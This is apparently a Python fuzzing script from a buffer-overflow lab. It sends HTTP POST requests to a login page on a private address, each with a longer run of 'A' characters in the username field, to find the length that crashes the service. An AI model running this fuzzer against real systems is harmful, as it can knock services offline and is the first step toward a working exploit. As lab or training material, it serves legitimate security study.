#!/usr/bin/python3

import sys
import socket
from time import sleep

size=100

while size<=10000: 
    print(f"Sending buffer: {size}")
    content=b"username=" + b"A" * size + b"password=A"

    buffer=b"POST /login HTTP/1.1\r\n"
    buffer+=b"Host: 192.168.1.6\r\n"
    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
    buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+=b"Accept-Encoding: gzip, deflate\r\n"
    buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+=b"Content-Length: "+str(len(content)).encode('utf-8')+b"\r\n"
    buffer+=b"Origin: http://192.168.1.6\r\n"
    buffer+=b"Connection: keep-alive\r\n"
    buffer+=b"Referer: http://192.168.1.6/login\r\n"
    buffer+=b"\r\n"

    buffer+=content

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.1.6',80))
    s.send(buffer)
    s.close()
    size+=100
    sleep(5)
